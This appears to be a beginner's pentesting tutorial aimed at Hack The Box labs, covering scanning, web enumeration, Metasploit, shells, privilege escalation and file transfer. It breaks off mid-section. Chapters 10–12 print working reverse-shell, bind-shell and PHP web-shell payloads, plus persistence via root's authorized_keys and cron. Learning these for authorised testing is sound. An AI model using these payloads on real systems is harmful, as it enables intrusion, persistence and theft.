### By: G.G.S | Discord: @zer0who | Github: Zer0plusOne

This book will guide the user through the essential concepts of pentesting, including the following information:

- Overview of Information Security
- Distributions oriented to penetration testing
- Common terms and technologies
- Fundamentals of scanning and enumeration
- Use of public exploits
- Shells, privilege escalation, and file transfer
- Navigation through the Hack The Box platform
- Step-by-step walkthrough of a retired HTB machine
- Common mistakes and how to ask questions effectively
- Completing a machine without using walkthroughs
- Next steps within the sector

## Chapter 1: Putting on the suit and the boots

Information security, or commonly referred to in the field as "InfoSec", comes to encompass the following areas within its capabilities:

- Network and infrastructure security
- Application security
- Security testing
- Systems auditing
- Business continuity planning
- Digital forensics
- Incident response and detection

As expected, each of these fields has one thing in common with the others, and that is risks, which leads me to explain the next thing to take into account globally, **risk management**.

This process is usually divided into 5 steps commonly across the sector.

|Step|Explanation|
|---|---|
|Identification|This step explains itself; it is the process that involves identifying a risk, whether possible or imminent. This does not include only cybersecurity risks, but also extends to things like the legal, market, regulatory area, or even in some cases environmental, having to take into account aspects such as floods and others.|
|Analysis|This step is immediately subsequent to identification.This consists of being able to determine the impact and probability of an identified risk in order to classify it by priorities.|
|Evaluation|With the risk identified and analyzed, this step indicates the process of final evaluation of the identified risk to proceed with its classification.|
|Containment|This step is basically the active principle; it is the procedure to take into account and execute to eliminate or contain a risk that has gone through all the previous phases.|
|Monitoring|Even with all of the above, it must always be taken into account that risks are what they are, things you expect not to happen but end up happening; therefore, carrying a monitoring process can be key to observing patterns, behaviors, and others that can help prevent a bigger catastrophe.|

With all of the above explained, it is time to talk about your role as the Pentester in this environment.

A **Security Assessor** (network pentester, web application pentester, red teamer, etc.), or what pentesters are liked to be called by the people in companies who wear ties, helps an organization identify risks in both their internal and external networks. These risks can be technical vulnerabilities, misconfigurations, exposure of sensitive data, or failures that, although they may not seem critical at a technical level, can end up causing a serious reputational impact. The job of a good pentester is not only to “break things”, but to know how to explain what risk exists, how it can be reproduced in a controlled way, and what options there are to mitigate or fix it, always aligning the technical part with the real needs of the client.

Assessments can take many forms: from a white-box pentest over all systems within scope, to phishing campaigns to measure employee awareness or red team exercises based on realistic scenarios. To correctly evaluate the vulnerabilities found, it is essential to understand the complete context of the organization and its risk management.

## Chapter 2: Many shoes, but they work for walking

Let’s talk about distributions. Anyone who wants to start a technical path in information security has to assume one thing from the beginning: they are going to coexist with **many systems, many technologies, and many different environments**. As pentesters, it is not enough to know how to “use tools”; you have to understand how both Linux and Windows systems are set up, maintained, and secured. Depending on the scope of the project, we may end up working from a Linux virtual machine, a Windows one, our own base system, a VM inside the client’s infrastructure, or even from a corporate machine to simulate an insider threat scenario. That is why, rather than marrying a specific system, the important thing is to feel comfortable moving between them.

For a long time, and like most people, I have gone through pentesting-oriented distributions like **Kali** or **Parrot**, which come loaded with tools and ready to use. They are comfortable, practical, and have everything necessary to get started quickly. Over time, however, you realize that you do not use even half of what they bring and that you end up always repeating the same tools. In my case, after trying, breaking, and reinstalling many times, I ended up working on a **clean Debian 12**, with no offensive focus by default. Why? Because in the end, Linux is Linux. With enough time, coffee, and more than one sleepless night, you can turn a **Toyota Corolla into a custom-made Lamborghini**. You install only what you need, you understand every piece you add, and you know exactly what your environment does and why.

That does not mean that there is a “better” distribution than another. Quite the opposite. The final reflection here is clear: **everyone should experiment**. Try Kali, Parrot, Ubuntu, Arch, Fedora… change desktop environments, use window managers, break things and rebuild them. Only then do you end up finding your tailored suit. The tool matters, yes, but what really makes the difference is **feeling comfortable with your environment**, truly understanding it and knowing how to adapt it to each situation. The rest comes on its own with practice.

## Chapter 3: A teenager’s room

If there is something that does not matter whether you are doing a real pentest, a CTF, a lab, a training module, or simply playing with HTB machines, it is this: **organization matters, a lot**. It does not matter how good you are technically; if you do not document from the beginning and do not know where you store things, sooner or later you will trip over yourself. And not only in security: this is one of those skills that serves you in any professional path.

This is where the “teenager’s room” comes into play. We all know what it is usually like: things on the floor, drawers full of useful crap mixed with trash, and the constant feeling that something important is there… but you do not know where. In pentesting, exactly the same thing happens if you do not organize yourself. Having a clear folder structure for each project, lab, or client saves you time, mistakes, and headaches. Separating scans, evidence, credentials, logs, screenshots, and scope is not being obsessive, it is being professional. Then everyone ends up adjusting the structure in their own way: some separate by host, others by network, others put everything in the notes manager. There is no correct way; there is **the one that allows you to work fast and without losing information**.

The same goes for note-taking tools. It is not a matter of which one is “the best”, but which one fits you. There are people who live happily with something simple and local, and others who prefer to set up a personal wiki with links, cheatsheets, and cross-references. The only thing that really matters here is **creating your own knowledge base**: common commands, payloads, steps you always repeat, report templates, checklists, and already-written vulnerabilities. Everything that seems obvious today is forgotten tomorrow. And the sooner you start documenting, the sooner it becomes a habit. In the end, a room can be messy… but if you know exactly where everything is, it stops being a problem.

To help the reader, I leave a small explanatory view of how your projects are expected to be organized as a professional.

```shell-session
Zer0plusOne@PwnDeb[/PWN]$ tree Projects/
Projects/
└── Company Name
    ├── EPT
    │   ├── evidence
    │   │   ├── credentials
    │   │   ├── data
    │   │   └── screenshots
    │   ├── logs
    │   ├── scans
    │   ├── scope
    │   └── tools
    └── IPT
        ├── evidence
        │   ├── credentials
        │   ├── data
        │   └── screenshots
        ├── logs
        ├── scans
        ├── scope
        └── tools
```

I have to say that for more casual things like practice and such, I would advise anyone to have this level of order, but if not, I am also going to tell you that organizing everything into 3 well-formatted and ready folders is enough. Your goal is to have everything well organized to avoid losing things and looking for them, so a simple classification can save you hours of searching for a .txt that had a hash you needed.

For this, I leave you here a small function that you can add to your .bashrc or .zshrc in your home to have it ready.

Copy and paste this into your .bashrc or .zshrc.

```bash
mkt(){
	mkdir nmap exploit content # creates the folders to classify what you find
}
```

Now to apply these changes:

```bash
# copy and paste depending on whether you use bash or zsh as your terminal emulator
source ~/.bashrc
source ~/.zshrc
```

And with this you will have a command that, by specifying

```http
mkt
```

In the terminal, will create the directories that I consider basic for any pentest, whether a lab or something professional.

## Chapter 4: Getting in without being there

A **VPN (Virtual Private Network)** is, basically, the simplest way to be inside a network without physically being there. It allows us to connect to a private network and access its systems as if we were plugged directly into the office switch. All of this is done by creating an **encrypted communication channel** over a public network such as the Internet. It is the same concept that an employee uses when connecting from home to their company’s corporate network, or we use when accessing a private pentesting lab.

At a high level, when we use a VPN, **our traffic stops going directly through our Internet provider** and instead goes first through the VPN server. From the outside, it looks like the traffic originates from that server and not from our machine. This adds a layer of privacy and security, since the content of the traffic is encrypted and cannot be easily spied on while it crosses public networks.

### Types of VPNs (the most common ones)

In real environments, we will mainly encounter two types of remote access VPNs:

- **Client-based VPN**  
    Requires installing specific software (for example, OpenVPN). Once connected, our equipment behaves almost as if it were inside the internal network: we can access hosts, subnets, and services according to what the configuration allows. In some cases we are given full access; in others, only to a specific segment reserved for remote users.
    
- **SSL VPN (from the browser)**  
    Works directly from the web browser. It is usually limited to specific applications such as mail or intranet, although in some cases it allows broader access. It is convenient because it does not require installing anything, but it is also usually more restrictive.


### Why use a VPN?

Outside of pentesting, many people use commercial VPN services to **hide their public IP** or bypass network restrictions. This can be useful, but it is worth being clear about something: **a VPN does not guarantee absolute anonymity**. You always have to trust the provider, and blind trust is never a good idea. A VPN can protect you on hostile networks (such as a public airport WiFi), but it does not free you from the consequences of doing things you should not do.

In offensive security, the VPN has another role: **it is the entry bridge to private networks** that we could not access in any other way.

### How do we know that we are connected?

Once connected, a new network interface will appear, usually called `tun0`:

```js
ifconfig
```

Seeing something like this indicates that the VPN is active:

```js
tun0: flags=4305<UP,POINTOPOINT,RUNNING> inet 10.10.x.2
```

If we want to see **which networks are now accessible through the VPN**, we can use:

```js
netstat -rn
```

There we will see that certain private networks (for example, those of HTB Academy) are routed through `tun0`. In other words: now we can reach systems that did not exist for us before.

### One last important warning

When you connect to a lab or pentesting VPN, **behave as if you were in enemy territory**. Do not reuse VMs from real clients, do not leave credentials stored, do not expose unnecessary services, and block everything you do not use. The VPN is an entry door, yes, but it can also be an exit door if you are not careful.

Getting in without being there is a great advantage.  
Knowing **when and how to do it without screwing things up** is what makes the difference.

## Chapter 5: The lingua franca of pentesting

Penetration testing and offensive security are huge fields. Along the way we are going to come across **a lot of technologies, concepts, and terms** that repeat themselves over and over again. It is not a closed or definitive list, but there are certain words that you have to understand well from the beginning if you do not want to feel like everyone is speaking a different language than you.

This chapter does not intend for you to memorize everything, but for you to start **recognizing patterns**. When you understand what something means, it stops sounding weird and starts making sense within the context.

### What is a shell?

The word _shell_ appears constantly, and it does not always mean exactly the same thing. On Linux systems, a shell is the program that receives the commands we type and passes them to the operating system to execute them. For many years it was the **only way to interact with a computer**, long before graphical interfaces existed.

Today we live with both worlds:

- terminals on Linux
- `cmd.exe` or PowerShell on Windows
- graphical interfaces that rely on all of the above

On Linux, the most common shell is **Bash**, although there are many others such as Zsh, Fish, or Ksh. But in pentesting, when someone says _“I got a shell”_, they are not talking about Bash as such, but about something much more important: **access to the system**.

Getting a shell means that the target system has been exploited and that we can now execute commands on it as if we were sitting in front of the machine.

### Most common types of shell

|Shell type|What it means|
|---|---|
|**Reverse shell**|The victim system initiates the connection back to our machine|
|**Bind shell**|The victim system opens a port and waits for us to connect|
|**Web shell**|Executes commands through a web application, usually in a limited way|

Each type has its context and usefulness, and they can be implemented in practically any language: Bash, Python, PHP, Perl, Go…  
The shell is a tool, not an end. What matters is **what you can do with it**.

### What is a port?

A port can be understood as a **door or window** of a system. The system is the house, and the services it offers are behind those doors. If a door is open or poorly closed, it can become an entry point.

Ports are managed by the operating system and are associated with specific services. Thanks to them, a system knows whether incoming traffic is for a web, for SSH, for mail, or for anything else.

There are two major types:

- **TCP**: connection-oriented, more reliable (Everything goes super safe but it is very slow)
- **UDP**: connectionless, faster but less reliable (Like a German highway, no limits but if you crash, you crash)

Each has up to **65535 ports**, and many of them are traditionally associated with specific services.

### Ports you should recognize without thinking

|Port|Service|Protocol name|
|---|---|---|
|21|FTP|File Transfer Protocol|
|22|SSH|Secure Shell|
|25|SMTP|Simple Mail Transfer Protocol|
|80|HTTP|HyperText Transfer Protocol|
|443|HTTPS|HyperText Transfer Protocol Secure|
|445|SMB|Server Message Block|
|3389|RDP|Remote Desktop Protocol|
|389|LDAP|Lightweight Directory Access Protocol|
|161|SNMP|Simple Network Management Protocol|

### What is a web server?

A web server is the component that receives HTTP requests from the browser and returns responses: pages, data, errors, whatever applies. They usually listen on ports **80 or 443**, and they tend to be the most exposed part of an infrastructure.

Precisely because of this, web applications are one of the favorite targets:

- they are exposed to the Internet
- they accept user input
- they are usually connected to databases and other internal systems

A single vulnerability in a web can open the door to the entire server.

### OWASP Top 10: the base map

When talking about web security, sooner or later the **OWASP Top 10** appears. It is not a list of “the only vulnerabilities that exist”, but of **the most critical and common ones**.

Some key examples:

- poorly implemented access controls
- injections (SQL, command, LDAP…)
- outdated components
- insecure configurations
- authentication failures
- lack of logging and monitoring

Knowing these categories does not make you an expert, but **it gives you a mental framework** to know what to look for and why.

### Key idea

All of this may sound like jargon at first, but it is not.  
It is simply **the language of the trade**.  
The sooner you start to understand it, the sooner you will stop translating mentally and start thinking directly in terms of attack, defense, and context.

## Chapter 6: The toolbox

In offensive security there are “pentesting” tools and then there are **the tools you use every day**, whether you like it or not. SSH, Netcat, tmux, and Vim are not designed to attack, but without mastering them you are crippled. It does not matter how good you are at exploiting vulnerabilities: if you do not know how to move comfortably around a system, your performance collapses.

These tools are transversal. You will use them doing CTFs, labs, real pentests, and also administering systems. That is why it is worth learning them well from the beginning.

### SSH: real remote access

**SSH (Secure Shell)** is the standard protocol for remotely accessing Linux systems (and many others) and usually listens on **port 22**. It allows authentication with a password or, more commonly in professional environments, through **public/private keys**.

In a pentest, SSH is gold. Many times we obtain:

- cleartext credentials
- a private key
- or the possibility of adding our public key

With that we can connect directly to the target system:

```rust
ssh user@192.168.0.1
```

An SSH session is usually **much more stable than a reverse shell**, and it also allows us to:

- use the system as a _jump host_
- pivot to other networks
- transfer tools
- establish persistence

When you can use SSH, it is almost always a better option than an improvised shell.

### Netcat: the Swiss army knife

**Netcat (nc)** is a brutally simple and brutally useful tool. It is used to interact with **TCP and UDP ports**, and in pentesting it is used for a thousand things.

A classic use is **banner grabbing**. If we connect to a port with netcat:

```rust
nc 10.10.10.10 22
```

and we receive something like:

```http
SSH-2.0-OpenSSH_X.Xpx Debian
```

we already know what service runs there and even its approximate version.

Netcat is also used to:

- receive reverse shells
- send commands
- transfer files
- manually test services

There are more powerful alternatives like **socat**, which allows things like:

- port redirection
- upgrading shells to interactive TTY
- more complex connections

If you can bring a binary with you, socat is usually a clear upgrade.

### Tmux: never lose a shell again

A **terminal multiplexer** like **tmux** allows you to have multiple windows and panes inside a single terminal. Once you start using it properly, there is no going back.

Installing it is trivial:

`sudo apt install tmux -y`

Once inside:

- `CTRL + B` is the prefix
- `CTRL + B` + `C` → new window
- `CTRL + B` + `%` → split vertical
- `CTRL + B` + `"` → split horizontal
- `CTRL + B` + arrows → move between panes

Tmux is especially useful for:

- not losing sessions
- keeping listeners active
- working with multiple hosts at the same time
- **logging everything you do**, something key in professional environments

### Vim: editing without a mouse and without excuses

**Vim** is one of those editors that you either hate or cannot live without. The reality is that **it is always there**: on compromised servers, on minimalist machines, and in environments where there is nothing else.

Opening a file:

```bash
vim /etc/hosts
```

When you open it you are in **normal mode** (navigation only).  
To edit, press `i` and you enter **insert mode**.  
To go back, `ESC`.

Basic commands worth memorizing:

|Command|Action|
|---|---|
|x|delete character|
|dw|delete word|
|dd|delete line|
|yw|copy word|
|yy|copy line|
|p|paste|

Save and exit:

- `:w` → save
- `:q` → exit
- `:wq` → save and exit
- `:q!` → exit without saving

Vim is not just an editor: it is a survival tool. Knowing how to use it allows you to modify configuration files, scripts, and data even in the most limited environments.

### Key idea

These tools are not “optionally useful”.  
They are **the base**.

You can know how to exploit the most complex vulnerability in the world, but if you do not know how to:

- keep a session stable
- organize yourself in the terminal
- edit files quickly
- move between systems

you will always be one step behind.  
Mastering the basics is what allows the advanced to work.

## Chapter 7: The holy grail of the Pentester

When we finally have an IP in front of us, the real game begins. Before exploiting anything, even before thinking about vulnerabilities, there is a mandatory question:  
**what is in front of us and how does it talk to me?**

A system is nothing more than a machine with an IP address and a series of **services listening on ports**. Those services are designed to do their normal job… but we are interested when they are misconfigured, outdated, or simply poorly designed. That is where we try to make them do something they **should not do**, such as execute commands or leak sensitive information.

Scanning services by hand, trying one by one all 65,535 ports, would be madness. That is why **Nmap** exists. And that is why it is, without exaggeration, one of the most important tools in all of pentesting.

### Nmap: seeing without touching (too much)

The most basic use of Nmap is almost insultingly simple:

`nmap 10.129.42.253`

With that, Nmap scans the **1,000 most common ports** and tells us which ones are open. In seconds we already know if there is FTP, SSH, web, SMB… and that already gives us huge clues about the system.

Typical example of output:

- FTP on 21
- SSH on 22
- HTTP on 80
- SMB on 139/445

With just that we already start to get an idea of the target. And over time, almost without thinking, you associate certain ports with certain systems. RDP on 3389 usually screams _Windows_. SSH usually smells like _Linux_. It is not infallible, but it guides you.

### Scanning well takes time (and is worth it)

When we want to get serious, Nmap also knows how to go deeper. The classic combo is:

```bash
nmap -sC -sV -p- $IP
```

This does several important things:

- `-p-` → scans **all ports**
- `-sV` → detects **service versions**
- `-sC` → runs **default scripts** to extract extra information

Here we no longer only see _what_ service there is, but **which exact version**, banners, weak configurations, anonymous authentications, web headers, etc.

Yes, it takes longer.  
But it is also when gifts start to appear.

As advice from someone who has been practicing for quite some time, I usually run the following combo:

```bash
# First command, we list the available ports on the target and save it to a .txt for later

nmap -sS -p- --min-rate X $Target_IP -oN first_scan.txt -vvv
```

Once we have this, we need to extract the exact ports that we have listed that have an available service that we can potentially exploit.

For this, I leave you a simple python script that we will simply execute with:

```bash
python3 script.py -t first_scan.txt # or failing that, the name we specified
```

Here is the script:

```python
#!/usr/bin/env python3

import argparse
import re

def extract_ports(filename):
    ports = []

    with open(filename, "r") as f:
        for line in f:
            # Matches lines like: 22/tcp open ssh
            match = re.match(r"^(\d+)/\w+\s+open", line)
            if match:
                ports.append(match.group(1))

    return ports

def main():
    parser = argparse.ArgumentParser(
        description="Extract open ports from an Nmap -oN output file"
    )
    parser.add_argument(
        "-t", "--target",
        required=True,
        help="Nmap output file (normal format, -oN)"
    )

    args = parser.parse_args()

    ports = extract_ports(args.target)

    if not ports:
        print("[-] No open ports found.")
        return

    print("[+] Open ports found:")
    print(", ".join(ports))

    print("\n[+] Ready-to-use Nmap format:")
    print(f"-p{','.join(ports)}")

if __name__ == "__main__":
    main()
```

This will give you the following output:

```bash
[+] Open ports found:
21, 22, 80, 139, 445

[+] Ready-to-use Nmap format:
-p21,22,80,139,445
```

Now with this, you can execute the following:

```bash
nmap -sC -sV --min-rate x -p21,22,80,139,445 $Target_IP -oN Serv_Enum.txt -vvv
```

### Banner grabbing: speaking the service’s language

Many services give themselves away. When you connect, **they introduce themselves**. That is banner grabbing.

You can do it with Nmap… or by hand with Netcat:

```js
nc -nv 127.0.0.1 21
```

If the server responds with:

`220 (vsFTPd 3.0.3)`

you already know exactly what is there. And now the question changes from _what is there_ to _what hurts it_.

### FTP: the classic that never dies

FTP keeps appearing more than it should.  
And when it appears with **anonymous login**, you have to look, no matter what.

Connecting is trivial:

```js
ftp 127.0.0.1
```

And from there:

- list directories
- download files
- find forgotten credentials

Many times, a simple `login.txt` is enough to advance the whole machine.

### SMB: lateral movement potential

SMB is one of the juiciest services, especially in Windows environments.  
It can give:

- shares with sensitive information
- reusable credentials
- lateral movement vectors
- even historical RCEs like EternalBlue

Enumerating shares with `smbclient` is usually mandatory:

```js
smbclient -L \\127.0.0.1 -N
```

And if there are credentials… try them. Always.

### SNMP: the great forgotten one

SNMP is another one of those services that, when misconfigured, **talks too much**.  
If someone left the community string at default (`public` or `private`), you can extract:

- host name
- kernel version
- processes
- routes
- interfaces

With tools like `snmpwalk` or `onesixtyone`, SNMP can become a brutal shortcut.

## Chapter 8: The storefront and the warehouse

When we scan services, we almost always end up running into web servers listening on ports **80 or 443**. And this is where many people relax… mistake.  
Web applications are usually **one of the biggest attack vectors** in a pentest. Not only because they are exposed, but because behind them there is usually **logic, files, hidden paths, and human errors**.

A web is not only what you see in the browser. It is what you **do not** see.

### Directory and file enumeration

The first thing I usually do when I find a web is ask myself:

> _What is here that I should not see?_

For that we use tools like **Gobuster** or **ffuf**, which allow us to discover hidden directories and files through brute force.

Basic example with Gobuster:

```http
gobuster dir -u http://127.0.0.1/ \ -w /usr/share/seclists/Discovery/Web-Content/common.txt`
```

Here we are not looking for magic, we are looking for **mistakes**:

- forgotten paths
- admin panels
- half-finished installations
- backups
- exposed configurations

In the example, `/wordpress` appears.  
And WordPress, as you already know, **is a party** if it is misconfigured or unfinished.

### Subdomains: the backyard

Many times the interesting stuff is not on the main web, but on **subdomains**:

- `admin.`
- `dev.`
- `test.`
- `blog.`
- `internal.`

With Gobuster we can also enumerate them:

```http
gobuster dns -d hackmyweb.com \ -w /usr/share/SecLists/Discovery/DNS/namelist.txt
```

Subdomains often host:

- internal panels
    
- testing environments
    
- forgotten applications
    
- unhardened services
    

And they are usually **much weaker** than the main web.

### Banner grabbing and HTTP headers

Before touching anything serious, it is convenient to know **what is behind it**.  
HTTP headers often talk more than they should.

```bash
curl -IL https://www.hackmyweb.com
```

Here we can discover:

- web server
- framework
- exposed APIs
- versions
- weak configurations

All this information serves to **reduce the search space** and focus attacks.

### Technology identification

To avoid doing everything by hand, tools like **whatweb** help a lot:

```c
whatweb 127.0.0.1
```

Or even against entire ranges:

```c
whatweb --no-errors 127.0.0.0/24
```

With this we obtain:

- web server
- language
- frameworks
- CMS
- libraries
- versions

It is not exploitation, it is **context**. And without context, you are blind.

### SSL certificates: free information

If the web uses HTTPS, the certificate can reveal:

- company names
- emails
- locations
- related domains

All of this can be useful later, especially if the scope allows **social engineering**.

### robots.txt: the classic that still works

Never skip this:

```c
/robots.txt
```

Although its function is to guide search engines, it often points exactly to what **they do not want you to see**:

- `/admin`
- `/private`
- `/uploads`

And yes, it still works in 2025.

### Source code: the enemy is human

Last step, but not less important:  
**view the source code**.

A simple `CTRL + U` can reveal:

- developer comments
- internal paths
- tokens
- test credentials

Because in the end, most failures are not technical, they are human.

## Chapter 9: Do not reinvent the bomb

Once we have identified the services running on the machine (thanks to Nmap and decent enumeration), the next logical step **is not to write exploits from scratch**, but to check if someone already did that work before us.

In real pentesting, and also in HTB, most initial accesses come from **known vulnerabilities**: misconfigured services, old versions, or software with public flaws. Our job here is not to be geniuses, but to be efficient.

## Searching for public exploits

First, the simplest, and many times the most effective: **search on Google**.  
Something as basic as:

> `OpenSSH 7.2 exploit`  
> `Windows 7 SMB exploit`

can already give us clear hints of where things are going.

From there, we move on to tools more designed for day-to-day use.

## Searchsploit: do not shoot blind

Searchsploit allows us to search for public exploits directly from our machine, using the Exploit-DB database.

Installation (if we do not have it):

```bash
sudo apt install exploitdb -y
```

Search example:

```js
searchsploit openssh 7.2
```

This returns a list of known exploits associated with that version or range of versions.  
Here **it is not about running the first thing you see**, but about:

- Reading the exploit title
- Seeing if it is remote or local
- Understanding if it requires authentication
- Checking if it is DoS, enumeration, or RCE

Many “exploits” will not give you access, but **they do give useful information**.

## Metasploit: the hammer is not the problem

Metasploit is not magic. It is a framework.  
Well used, it is a brutal tool. Poorly used, it turns you into someone who does not know what is happening.

Metasploit allows us to:

- Enumerate services
- Verify vulnerabilities without exploiting them
- Exploit in a controlled way
- Manage sessions and post-exploitation

It is launched with:

```js
msfconsole
```

## Searching for an exploit inside Metasploit

Following the classic SMB example:

```js
msf6 > search exploit eternalblue
```

Here we find modules related to **MS17-010**.  
We choose one and load it:

```js
msf6 > use exploit/windows/smb/ms17_010_psexec
```

Before executing anything, **always**:

```js
show options
```

Everything that appears as `Required: yes` must be configured.  
In this case, the minimum is usually:

- `RHOSTS` → target IP
- `LHOST` → our IP or interface (for example `tun0`

```js
set RHOSTS 10.10.10.40 set LHOST tun0
```

## First check, then exploit

If the module allows it, **use `check`**:

```js
check
```

This tells us if the target **appears to be vulnerable**, without touching it yet.  
Not all modules support it, but when it is available, use it.

## Controlled exploitation

If everything makes sense, then yes:

```http
exploit
```

In this example, the result is a **SYSTEM** session on a vulnerable Windows 7 machine, and interactive access to the shell.

This is not luck.  
It is the result of **enumerating well**, searching for exploits with a clear head, and understanding what you are launching.

## Chapter 10: Everything so you talk to me

Once we compromise a system and manage to execute commands remotely, there is an obvious problem: it is not viable to exploit the same vulnerability over and over again every time we want to run a command. To be able to enumerate the system calmly, move through it, or take the next step inside the network, we need something more stable: **a way to “talk” directly with the system**. That is where _shells_ come in.

A shell is nothing more than direct access to the console of the remote system, whether it is Bash on Linux or PowerShell on Windows. On some occasions we will be able to access using “legitimate” protocols like SSH or WinRM, but unless we have valid credentials, we will usually first need to **obtain a shell** by exploiting a vulnerability.

In general terms, we will encounter three types of shells: **reverse shell, bind shell, and web shell**. All of them serve to execute commands, but each one communicates with us in a different way and has advantages and disadvantages.

### Reverse Shell – A call comes in

The _reverse shell_ is the most common and, in most scenarios, the quickest to obtain. The idea is simple: we leave a port open listening on our machine and force the compromised system to connect back to us and hand us its shell.

First we raise a listener with netcat:

```bash
nc -lvnp 1234
```

With this we leave our system waiting for an incoming connection on port 1234. Now we need to know **which IP the target should connect to**. In environments like Hack The Box, this IP will be that of the `tun0` interface, since all communication goes through the VPN.

```js
ip a
```

Once we have the correct IP, we execute on the victim system a reverse shell command. Depending on the operating system and available tools, the command will vary. Some reliable examples are:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```js
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

On Windows, we will usually resort to PowerShell with a longer but equally effective payload.

If everything goes well, we will see how the system connects to our listener and we will be able to execute commands directly:

```ls
id
```

The big advantage of the reverse shell is its speed. The disadvantage is that **it is fragile**: if the connection drops or the process dies, we will have to exploit the system again to recover it.

### Bind Shell – Knock knock, it’s me

The _bind shell_ works the other way around. Instead of the system connecting back to us, we make the victim system **open a port and stay listening**, waiting for us to connect.

We execute on the compromised system a command that “binds” the shell to a port, for example:

```js
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Once this is done, from our machine we simply connect:

```js
nc 10.10.10.1 1234
```

The main advantage here is that if we lose the connection, we can reconnect as long as the process stays alive. The problem is that **it requires the port to be accessible**, which does not always happen due to firewalls or network rules.

### Making the shell usable: TTY upgrade

Shells obtained with netcat are usually very limited: no history, keys do not work well, we cannot comfortably use editors… To fix this, it is convenient to **turn the shell into a full TTY**.

A very common method is to use Python:

```c
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then, we do `CTRL+Z`, adjust the local terminal, and recover the session:

```c
stty raw -echo fg
```

Finally, we adjust the environment variables so the shell looks correct:

```js
export TERM=xterm-256color stty rows 67 columns 318
```

With this, the shell will behave practically the same as an SSH session.

### Web Shell – No port? No problem

The last type is the _web shell_. Instead of opening new connections, it relies on the web server itself. Basically it is a small script (PHP, ASPX, JSP…) that receives commands over HTTP, executes them, and returns the result.

A classic example in PHP is this:

```php
<?php system($_REQUEST["cmd"]); ?>
```

Once uploaded to the server (usually via a file upload vulnerability or by writing it directly to the _webroot_), we can execute commands by accessing the URL:

```php
http://SERVER_IP/shell.php?cmd=id
```

The big advantage of the web shell is that **it usually bypasses firewalls**, since it works over the web port (80/443). Also, if the system reboots, the shell is still there. The disadvantage is clear: it is not interactive and it is slower to work with, although it can be automated.

## Chapter 11: I am missing keys to continue

Almost never does the initial access to a machine give us full control. The normal thing is to enter as a low-privilege user (www-data, some random user, etc.), just enough to execute commands, but not to really rule. If we want full control, we need to escalate privileges up to **root on Linux** or **Administrator / SYSTEM on Windows**.

From here on, the objective is simple: **look for an internal weakness in the system that allows us to level up**.

### Enumerate before breaking anything

Once inside, the first thing is not to exploit blindly, but to **enumerate the system well**. This is where checklists and cheat sheets come into play.

Two resources that I consider almost mandatory:

- **HackTricks** → very well-organized checklists for Linux and Windows.
- **PayloadsAllTheThings** → both payloads and privesc guides.

The key is to try commands, understand _why_ something is vulnerable, and not limit yourself to copy-paste.

### Enumeration scripts (yes, but with a brain)

Many manual checks can be automated with scripts that review the system looking for weak configurations.

Some classics:

- **Linux**: LinEnum, linuxprivchecker
- **Windows**: Seatbelt, JAWS
- **Cross-platform**: **PEASS (LinPEAS / WinPEAS)**

These scripts generate huge reports, but very well colored and highlighting what matters. Even so, **they are not magic**: you have to know how to interpret what comes out.

**Careful**: they make a lot of noise. In real environments they can trigger alerts or even get blocked. Sometimes it is better to enumerate by hand.

### Kernel exploits: the big hammer

If the system is old or poorly patched, **the kernel is the first place to look**.

Example:

- Linux kernel `3.9.0-73-generic`
- You search exploits → **DirtyCow (CVE-2016-5195)** appears

This usually gives root directly, but:

- It can break the system
- It is never launched in production without explicit permission
- Ideal to test it first in a lab

On Windows exactly the same thing happens with old unpatched versions.

### Vulnerable installed software

Another classic: **old software**.

On Linux:

```ls
dpkg -l
```

On Windows:

- `C:\Program Files`
- `C:\Program Files (x86)`

If something is outdated, you look for a public exploit and evaluate if it works for privesc.

### User privileges: a crack that leads to a hole

This is where many machines fall.

#### sudo (Linux)

Always check:

```bash
sudo -l
```

If you see something like:

```js
(ALL : ALL) ALL
```

instant root.

If you see NOPASSWD:

```js
(user : user) NOPASSWD: /bin/echo
```

Then you can execute that binary without a password. With **GTFOBins** many times that is enough to get a shell as root.

Example:

```bash
sudo -u user /bin/echo hello
```

If the binary is on GTFOBins, there is probably a way to abuse it.

### Scheduled tasks and cron jobs

Automatic tasks are pure gold.

On Linux, check:

- `/etc/crontab`
- `/etc/cron.d`
- `/var/spool/cron/crontabs/root`

If you can **write to something that root executes**, you can drop a malicious script (for example, a reverse shell) and wait.

On Windows the same thing happens with scheduled tasks.

### Exposed credentials (very common)

Configuration files, logs, histories… there is always sensitive junk.

Typical example:

```php
$conn = new mysqli('localhost', 'db_user', 'password123');
```

With that password:

- Try databases
- Try `su`
- Try SSH
- Try credential reuse

Many machines die here without the need for exploits.

### SSH keys: clean and persistent access

If you can **read**:

```ls
/home/user/.ssh/id_rsa /root/.ssh/id_rsa
```

You copy the key, adjust permissions, and enter:

```ls
chmod 600 id_rsa ssh root@IP -i id_rsa
```

If you can **write** to `.ssh/authorized_keys`, even better: you add your public key and you have persistent passwordless access.

Generate key:

```ls
ssh-keygen -f key
```

Add it:

```ls
echo "ssh-rsa AAAA... user@host" >> /root/.ssh/authorized_keys
```

And done:

```ls
ssh root@IP -i key
```

## Chapter 12: You've got mail

In any pentesting exercise there comes an inevitable moment: **files have to be moved**. Whether it is uploading enumeration scripts, exploits, binaries, or downloading interesting information from the compromised machine. If we use Meterpreter this is trivial, but with a **normal reverse shell** you need to know how to manage.

The idea is simple: **send things to the target or get them out of there**, using whatever we have available.

### Fast HTTP server (wget / curl)

The most convenient method when the target can reach our machine.

On our side, we go to the directory where the file is and raise a fast HTTP server with Python:

```ls
cd /tmp
python3 -m http.server 8000
```

With this we are serving the files over port 8000.

From the remote machine, we download the file with `wget`:

```http
wget http://10.10.14.1:8000/linenum.sh
```

If `wget` is not available (very common), we use `curl`:

```http
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

Here:

- `10.10.14.1` is our IP (tun0 in HTB)
- `-o` indicates the output file name

Simple, fast, and effective.

### SCP (if we have SSH)

If we already have **valid SSH credentials**, SCP is probably the cleanest option.

From our machine:

```ls
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

We enter the password and done.  
Everything after `:` is the remote path where the file will be saved.

### Base64: when everything else fails

There are situations where:

- The firewall blocks downloads
- There is no wget or curl
- There is no network egress

Here comes the ugliest but most reliable method: **Base64**.

On our machine, we encode the file:

